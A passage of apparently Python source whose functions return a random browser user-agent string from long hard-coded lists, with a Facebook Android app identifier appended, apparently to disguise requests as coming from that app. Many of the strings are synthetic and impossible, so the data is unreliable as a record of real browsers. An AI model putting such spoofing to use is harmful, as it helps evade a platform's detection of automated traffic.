RU) AppleWebKit/536.0.2 (KHTML, like Gecko) Version/7.0.4 Safari/536.0.2","Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.1; .NET CLR 3.2.95766.5)","Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.1; .NET CLR 3.7.61018.1)","Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/7.0; .NET CLR 2.3.42508.1)","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_8)  AppleWebKit/536.1.1 (KHTML, like Gecko) Chrome/38.0.892.0 Safari/536.1.1","Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/533.1.1 (KHTML, like Gecko) Chrome/28.0.860.0 Safari/533.1.1","Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/533.1.0 (KHTML, like Gecko) Chrome/18.0.808.0 Safari/533.1.0","Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/532.2.1 (KHTML, like Gecko) Chrome/30.0.807.0 Safari/532.2.1","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_9)  AppleWebKit/538.0.2 (KHTML, like Gecko) Chrome/25.0.837.0 Safari/538.0.2","Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/531.2.2 (KHTML, like Gecko) Chrome/33.0.886.0 Safari/531.2.2","Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/531.1.0 (KHTML, like Gecko) Chrome/37.0.849.0 Safari/531.1.0","Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/534.2.1 (KHTML, like Gecko) Chrome/30.0.817.0 Safari/534.2.1","Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 5.2; Trident/3.0; .NET CLR 3.1.78462.9)","Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/534.1.0 (KHTML, like Gecko) Chrome/31.0.821.0 Safari/534.1.0","Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/537.0.1 (KHTML, like Gecko) Chrome/21.0.825.0 Safari/537.0.1","Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/535.1.0 (KHTML, like Gecko) Chrome/26.0.867.0 Safari/535.1.0","Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/537.2.0 (KHTML, like Gecko) Chrome/17.0.885.0 Safari/537.2.0","Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 5.3; Trident/7.0; .NET CLR 4.7.57158.8)","Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/536.1.1 (KHTML, like Gecko) Chrome/37.0.890.0 Safari/536.1.1","Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 5.3; Trident/7.1; .NET CLR 4.3.30588.9)","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7)  AppleWebKit/532.1.2 (KHTML, like Gecko) Chrome/30.0.899.0 Safari/532.1.2","Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/532.2.0 (KHTML, like Gecko) Chrome/13.0.884.0 Safari/532.2.0","Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 5.0; Trident/4.0; .NET CLR 1.9.93429.5)","Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/534.1.0 (KHTML, like Gecko) Chrome/33.0.857.0 Safari/534.1.0","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_9_9 rv:5.0; ET) AppleWebKit/534.0.0 (KHTML, like Gecko) Version/5.0.0 Safari/534.0.0","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_5)  AppleWebKit/535.0.1 (KHTML, like Gecko) Chrome/31.0.883.0 Safari/535.0.1","Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/534.0.2 (KHTML, like Gecko) Chrome/36.0.818.0 Safari/534.0.2","Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/534.2.0 (KHTML, like Gecko) Chrome/36.0.802.0 Safari/534.2.0","Opera/12.82 (Windows NT 5.1; U; UK Presto/2.9.171 Version/11.00)","Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/538.1.0 (KHTML, like Gecko) Chrome/20.0.880.0 Safari/538.1.0","Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/533.0.0 (KHTML, like Gecko) Chrome/25.0.847.0 Safari/533.0.0","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_10_2)  AppleWebKit/534.0.2 (KHTML, like Gecko) Chrome/14.0.886.0 Safari/534.0.2","Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/534.2.1 (KHTML, like Gecko) Chrome/23.0.833.0 Safari/534.2.1","Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/536.0.2 (KHTML, like Gecko) Chrome/17.0.899.0 Safari/536.0.2","Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 5.3; Trident/5.0; .NET CLR 3.2.24044.4)","Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/537.2.1 (KHTML, like Gecko) Chrome/32.0.809.0 Safari/537.2.1","Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/532.2.2 (KHTML, like Gecko) Chrome/38.0.888.0 Safari/532.2.2","Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/534.2.2 (KHTML, like Gecko) Chrome/24.0.801.0 Safari/534.2.2","Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/533.1.1 (KHTML, like Gecko) Chrome/13.0.872.0 Safari/533.1.1","Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/533.1.0 (KHTML, like Gecko) Chrome/31.0.845.0 Safari/533.1.0","Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/536.1.0 (KHTML, like Gecko) Chrome/25.0.892.0 Safari/536.1.0","Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/533.2.2 (KHTML, like Gecko) Chrome/19.0.824.0 Safari/533.2.2","Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.3; Trident/5.0; .NET CLR 4.7.99214.7)","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_7 rv:3.0; RM) AppleWebKit/534.1.1 (KHTML, like Gecko) Version/5.1.4 Safari/534.1.1","Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/538.0.1 (KHTML, like Gecko) Chrome/34.0.893.0 Safari/538.0.1","Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_4)  AppleWebKit/535.1.1 (KHTML, like Gecko) Chrome/17.0.843.0 Safari/535.1.1","Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 5.2; Trident/4.1; .NET CLR 1.7.11417.4)","Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/533.0.1 (KHTML, like Gecko) Chrome/32.0.880.0 Safari/533.0.1","Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.2; Trident/4.0; .NET CLR 3.8.32379.5)","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.8.1; rv:13.3) Gecko/20100101 Firefox/13.3.9","Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.0; Trident/5.0; .NET CLR 2.1.23184.4)","Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/4.1; .NET CLR 2.0.64501.9)","Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/535.0.2 (KHTML, like Gecko) Chrome/25.0.839.0 Safari/535.0.2","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_0)  AppleWebKit/536.1.2 (KHTML, like Gecko) Chrome/25.0.830.0 Safari/536.1.2","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_7)  AppleWebKit/535.1.0 (KHTML, like Gecko) Chrome/22.0.836.0 Safari/535.1.0","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_1 rv:2.0; SE) AppleWebKit/533.2.1 (KHTML, like Gecko) Version/7.0.4 Safari/533.2.1","Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8.0; rv:5.4) Gecko/20100101 Firefox/5.4.7","Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/533.0.0 (KHTML, like Gecko) Chrome/38.0.805.0 Safari/533.0.0","Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/538.0.1 (KHTML, like Gecko) Chrome/39.0.808.0 Safari/538.0.1","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.7.4; rv:5.1) Gecko/20100101 Firefox/5.1.5","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_9 rv:3.0; AR) AppleWebKit/531.2.0 (KHTML, like Gecko) Version/5.0.5 Safari/531.2.0","Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.0; Trident/5.0; .NET CLR 1.9.32054.0)","Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.2; Trident/4.1; .NET CLR 3.6.24353.7)","Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; .NET CLR 3.0.87344.5)","Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/537.2.0 (KHTML, like Gecko) Chrome/24.0.810.0 Safari/537.2.0","Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/536.1.0 (KHTML, like Gecko) Chrome/27.0.834.0 Safari/536.1.0","Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.2; Trident/3.1; .NET CLR 4.4.80024.2)","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_4)  AppleWebKit/536.1.2 (KHTML, like Gecko) Chrome/22.0.866.0 Safari/536.1.2","Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 5.0; Trident/4.0; .NET CLR 1.6.32849.3)","Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 5.0; Trident/6.1; .NET CLR 3.0.26971.1)","Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/532.2.2 (KHTML, like Gecko) Chrome/36.0.874.0 Safari/532.2.2","Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/532.2.2 (KHTML, like Gecko) Chrome/18.0.899.0 Safari/532.2.2","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_10_9 rv:2.0; IT) AppleWebKit/533.2.0 (KHTML, like Gecko) Version/4.0.2 Safari/533.2.0","Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/535.0.0 (KHTML, like Gecko) Chrome/38.0.811.0 Safari/535.0.0","Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/532.0.2 (KHTML, like Gecko) Chrome/15.0.812.0 Safari/532.0.2","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5.8; rv:8.7) Gecko/20100101 Firefox/8.7.2","Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/537.2.1 (KHTML, like Gecko) Chrome/20.0.839.0 Safari/537.2.1","Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/534.1.0 (KHTML, like Gecko) Chrome/15.0.840.0 Safari/534.1.0","Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/7.0; .NET CLR 1.9.11062.4)","Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/536.0.1 (KHTML, like Gecko) Chrome/32.0.881.0 Safari/536.0.1","Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/534.0.2 (KHTML, like Gecko) Chrome/28.0.876.0 Safari/534.0.2","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4)  AppleWebKit/538.2.1 (KHTML, like Gecko) Chrome/15.0.836.0 Safari/538.2.1","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5 rv:4.0; NE) AppleWebKit/533.2.0 (KHTML, like Gecko) Version/7.0.3 Safari/533.2.0","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_6 rv:3.0; IT) AppleWebKit/531.0.1 (KHTML, like Gecko) Version/5.0.4 Safari/531.0.1","Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/531.0.1 (KHTML, like Gecko) Chrome/31.0.846.0 Safari/531.0.1","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_0 rv:2.0; MO) AppleWebKit/534.0.2 (KHTML, like Gecko) Version/4.0.7 Safari/534.0.2","Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 5.0; Trident/4.1; .NET CLR 4.6.18072.0)","Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/537.2.2 (KHTML, like Gecko) Chrome/26.0.853.0 Safari/537.2.2","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_1 rv:5.0; TK) AppleWebKit/536.0.2 (KHTML, like Gecko) Version/6.0.2 Safari/536.0.2","Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/6.0; .NET CLR 2.6.17019.9)","Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/536.0.1 (KHTML, like Gecko) Chrome/17.0.889.0 Safari/536.0.1","Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/538.2.0 (KHTML, like Gecko) Chrome/20.0.829.0 Safari/538.2.0","Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0; .NET CLR 4.4.63311.6)","Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.3; Trident/6.0; .NET CLR 4.9.99021.7)","Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/538.0.0 (KHTML, like Gecko) Chrome/23.0.893.0 Safari/538.0.0","Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.2; Trident/6.1; .NET CLR 3.7.43118.4)","Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/536.0.1 (KHTML, like Gecko) Chrome/32.0.800.0 Safari/536.0.1","Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/5.0; .NET CLR 1.6.31143.5)","Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/7.0; .NET CLR 3.1.50432.3)","Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/538.2.1 (KHTML, like Gecko) Chrome/33.0.869.0 Safari/538.2.1","Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/537.1.1 (KHTML, like Gecko) Chrome/35.0.892.0 Safari/537.1.1","Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/532.2.0 (KHTML, like Gecko) Chrome/32.0.861.0 Safari/532.2.0","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3)  AppleWebKit/533.0.2 (KHTML, like Gecko) Chrome/38.0.816.0 Safari/533.0.2","Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/535.1.2 (KHTML, like Gecko) Chrome/22.0.810.0 Safari/535.1.2","Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/536.1.0 (KHTML, like Gecko) Chrome/19.0.822.0 Safari/536.1.0","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_5)  AppleWebKit/532.0.2 (KHTML, like Gecko) Chrome/33.0.845.0 Safari/532.0.2","Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.0; Trident/3.0; .NET CLR 1.5.45636.2)","Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/537.2.1 (KHTML, like Gecko) Chrome/39.0.851.0 Safari/537.2.1",])+END       
    return ua

def randBuildvsskj():
    END = '[FBAN/FB4A;FBAV/377.1.0.36.103;FBBV/350971997;FBDM/{density=3.07}]'
    ua = random.choice(["Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.3; Trident/6.0; .NET CLR 3.5.94676.6)","Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/535.0.0 (KHTML, like Gecko) Chrome/19.0.845.0 Safari/535.0.0","Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/535.0.2 (KHTML, like Gecko) Chrome/32.0.832.0 Safari/535.0.2","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_0 rv:6.0; BO) AppleWebKit/534.0.1 (KHTML, like Gecko) Version/7.0.0 Safari/534.0.1","Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/537.0.0 (KHTML, like Gecko) Chrome/27.0.821.0 Safari/537.0.0","Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/538.1.0 (KHTML, like Gecko) Chrome/38.0.821.0 Safari/538.1.0","Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/533.2.2 (KHTML, like Gecko) Chrome/18.0.846.0 Safari/533.2.2","Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.0; Trident/5.1; .NET CLR 4.0.54488.2)","Opera/14.65 (Windows NT 5.2; U; PT Presto/2.9.180 Version/10.00)","Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/533.1.1 (KHTML, like Gecko) Chrome/31.0.862.0 Safari/533.1.1","Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/532.0.0 (KHTML, like Gecko) Chrome/23.0.859.0 Safari/532.0.0","Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 5.3; Trident/4.0; .NET CLR 4.1.99875.9)","Mozilla/5.0 (Windows NT 5.0; Win64; x64; rv:15.2) Gecko/20100101 Firefox/15.2.5","Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/537.1.1 (KHTML, like Gecko) Chrome/26.0.840.0 Safari/537.1.1","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_4)  AppleWebKit/532.2.2 (KHTML, like Gecko) Chrome/17.0.812.0 Safari/532.2.2","Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/533.0.1 (KHTML, like Gecko) Chrome/29.0.845.0 Safari/533.0.1","Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/532.1.1 (KHTML, like Gecko) Chrome/25.0.841.0 Safari/532.1.1","Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 5.2; Trident/6.0; .NET CLR 3.7.26228.6)","Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/538.0.0 (KHTML, like Gecko) Chrome/17.0.877.0 Safari/538.0.0","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_8_6 rv:4.0; KG) AppleWebKit/537.0.2 (KHTML, like Gecko) Version/5.0.1 Safari/537.0.2","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_9 rv:2.0; BR) AppleWebKit/534.1.1 (KHTML, like Gecko) Version/6.0.10 Safari/534.1.1","Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/533.1.2 (KHTML, like Gecko) Chrome/33.0.812.0 Safari/533.1.2","Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/532.1.2 (KHTML, like Gecko) Chrome/13.0.826.0 Safari/532.1.2","Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/532.2.2 (KHTML, like Gecko) Chrome/31.0.891.0 Safari/532.2.2","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_4 rv:4.0; CE) AppleWebKit/537.1.2 (KHTML, like Gecko) Version/4.0.5 Safari/537.1.2","Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/538.2.2 (KHTML, like Gecko) Chrome/36.0.869.0 Safari/538.2.2","Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/532.1.2 (KHTML, like Gecko) Chrome/24.0.820.0 Safari/532.1.2","Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/533.0.0 (KHTML, like Gecko) Chrome/33.0.892.0 Safari/533.0.0","Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/533.0.2 (KHTML, like Gecko) Chrome/16.0.855.0 Safari/533.0.2","Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/531.2.0 (KHTML, like Gecko) Chrome/13.0.842.0 Safari/531.2.0","Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.2; Trident/4.0; .NET CLR 2.1.22222.0)","Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 5.2; Trident/3.0; .NET CLR 4.8.27257.6)","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_10_0 rv:4.0; TY) AppleWebKit/534.1.0 (KHTML, like Gecko) Version/4.0.4 Safari/534.1.0","Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/534.2.1 (KHTML, like Gecko) Chrome/20.0.878.0 Safari/534.2.1","Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10.4; rv:13.2) Gecko/20100101 Firefox/13.2.7","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_5)  AppleWebKit/538.0.2 (KHTML, like Gecko) Chrome/27.0.861.0 Safari/538.0.2","Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/535.1.0 (KHTML, like Gecko) Chrome/36.0.875.0 Safari/535.1.0","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6.7; rv:12.0) Gecko/20100101 Firefox/12.0.3","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_9 rv:5.0; FR) AppleWebKit/531.0.1 (KHTML, like Gecko) Version/5.1.5 Safari/531.0.1","Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/536.0.1 (KHTML, like Gecko) Chrome/35.0.877.0 Safari/536.0.1","Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/531.0.1 (KHTML, like Gecko) Chrome/16.0.899.0 Safari/531.0.1","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.7.7; rv:9.8) Gecko/20100101 Firefox/9.8.3","Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/531.2.2 (KHTML, like Gecko) Chrome/24.0.827.0 Safari/531.2.2","Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.3; Trident/7.1; .NET CLR 2.5.22483.5)","Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/533.2.0 (KHTML, like Gecko) Chrome/21.0.899.0 Safari/533.2.0","Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/531.2.2 (KHTML, like Gecko) Chrome/21.0.850.0 Safari/531.2.2","Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/536.0.2 (KHTML, like Gecko) Chrome/27.0.806.0 Safari/536.0.2","Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/537.2.0 (KHTML, like Gecko) Chrome/17.0.830.0 Safari/537.2.0","Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/532.0.2 (KHTML, like Gecko) Chrome/17.0.850.0 Safari/532.0.2","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.9.2; rv:5.9) Gecko/20100101 Firefox/5.9.9","Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.3; Trident/7.0; .NET CLR 3.3.20001.4)","Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/532.1.2 (KHTML, like Gecko) Chrome/28.0.802.0 Safari/532.1.2","Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/537.1.2 (KHTML, like Gecko) Chrome/37.0.880.0 Safari/537.1.2","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.8.4; rv:11.6) Gecko/20100101 Firefox/11.6.2","Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/531.0.1 (KHTML, like Gecko) Chrome/38.0.880.0 Safari/531.0.1","Opera/13.42 (Windows NT 6.1; U; HT Presto/2.9.173 Version/10.00)","Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/536.1.0 (KHTML, like Gecko) Chrome/33.0.810.0 Safari/536.1.0","Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/534.0.0 (KHTML, like Gecko) Chrome/28.0.895.0 Safari/534.0.0","Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/538.2.2 (KHTML, like Gecko) Chrome/20.0.851.0 Safari/538.2.2","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_7_7)  AppleWebKit/535.2.0 (KHTML, like Gecko) Chrome/16.0.878.0 Safari/535.2.0","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4 rv:3.0; LI) AppleWebKit/535.1.1 (KHTML, like Gecko) Version/7.0.9 Safari/535.1.1","Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 5.3; Trident/3.1; .NET CLR 3.9.24933.3)","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3)  AppleWebKit/531.0.2 (KHTML, like Gecko) Chrome/28.0.813.0 Safari/531.0.2","Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/533.2.1 (KHTML, like Gecko) Chrome/21.0.890.0 Safari/533.2.1","Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/535.1.0 (KHTML, like Gecko) Chrome/13.0.890.0 Safari/535.1.0","Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.3; Trident/5.1; .NET CLR 2.1.59033.3)","Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/536.0.0 (KHTML, like Gecko) Chrome/30.0.899.0 Safari/536.0.0","Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/535.2.1 (KHTML, like Gecko) Chrome/21.0.851.0 Safari/535.2.1","Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.2; Trident/3.1; .NET CLR 2.8.44624.9)","Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/534.2.2 (KHTML, like Gecko) Chrome/18.0.814.0 Safari/534.2.2","Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/532.1.2 (KHTML, like Gecko) Chrome/27.0.812.0 Safari/532.1.2","Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/538.2.1 (KHTML, like Gecko) Chrome/32.0.802.0 Safari/538.2.1","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.7.2; rv:6.8) Gecko/20100101 Firefox/6.8.1","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_7 rv:3.0; AN) AppleWebKit/533.2.2 (KHTML, like Gecko) Version/7.1.5 Safari/533.2.2","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_8_6)  AppleWebKit/531.0.1 (KHTML, like Gecko) Chrome/24.0.877.0 Safari/531.0.1","Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/537.1.2 (KHTML, like Gecko) Chrome/38.0.881.0 Safari/537.1.2","Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/536.1.0 (KHTML, like Gecko) Chrome/15.0.809.0 Safari/536.1.0","Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/538.2.0 (KHTML, like Gecko) Chrome/33.0.813.0 Safari/538.2.0","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_8 rv:4.0; PT) AppleWebKit/531.1.0 (KHTML, like Gecko) Version/7.0.1 Safari/531.1.0","Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.3; Trident/5.1; .NET CLR 1.3.74858.9)","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_8)  AppleWebKit/533.0.1 (KHTML, like Gecko) Chrome/21.0.832.0 Safari/533.0.1","Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/531.2.0 (KHTML, like Gecko) Chrome/32.0.849.0 Safari/531.2.0","Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/538.1.1 (KHTML, like Gecko) Chrome/20.0.885.0 Safari/538.1.1","Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/533.2.1 (KHTML, like Gecko) Chrome/17.0.823.0 Safari/533.2.1","Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/535.2.2 (KHTML, like Gecko) Chrome/21.0.825.0 Safari/535.2.2","Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/535.1.1 (KHTML, like Gecko) Chrome/30.0.835.0 Safari/535.1.1","Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/538.2.1 (KHTML, like Gecko) Chrome/19.0.874.0 Safari/538.2.1","Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/532.1.2 (KHTML, like Gecko) Chrome/38.0.819.0 Safari/532.1.2","Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/531.1.2 (KHTML, like Gecko) Chrome/32.0.889.0 Safari/531.1.2","Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/534.1.1 (KHTML, like Gecko) Chrome/28.0.834.0 Safari/534.1.1","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_1)  AppleWebKit/531.0.0 (KHTML, like Gecko) Chrome/31.0.812.0 Safari/531.0.0","Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/538.1.1 (KHTML, like Gecko) Chrome/19.0.889.0 Safari/538.1.1","Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.0; Trident/7.1; .NET CLR 3.0.38333.9)","Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/531.1.0 (KHTML, like Gecko) Chrome/26.0.825.0 Safari/531.1.0","Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10.0; rv:15.1) Gecko/20100101 Firefox/15.1.7","Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/534.0.1 (KHTML, like Gecko) Chrome/35.0.896.0 Safari/534.0.1","Mozilla/5.0 (Macintosh; Intel Mac OS X 10.5.3; rv:12.7) 